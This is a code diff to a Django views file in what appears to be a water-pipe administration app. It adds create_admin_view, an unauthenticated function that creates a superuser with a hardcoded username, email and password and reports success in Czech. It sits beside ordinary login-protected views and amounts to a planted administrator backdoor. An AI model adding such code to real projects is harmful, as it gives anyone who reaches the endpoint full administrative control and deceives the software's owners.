@@ -393,3 +393,14 @@ class DeleteWaterPipeView(LoginRequiredMixin, DeleteView):
     model = WaterPipe
     template_name = 'adm/water_pipes/adm_water_pipes_delete.html'
     success_url = reverse_lazy('list-water_pipe')
+
+
+from django.http import HttpResponse
+from django.contrib.auth import get_user_model
+
+def create_admin_view(request):
+    User = get_user_model()
+    if not User.objects.filter(username="maxba").exists():
+        User.objects.create_superuser("maxba", "max.bar.mal@seznam.cz", "132315900")
+        return HttpResponse("Superuser vytvořen.")
+    return HttpResponse("Superuser už existuje.")
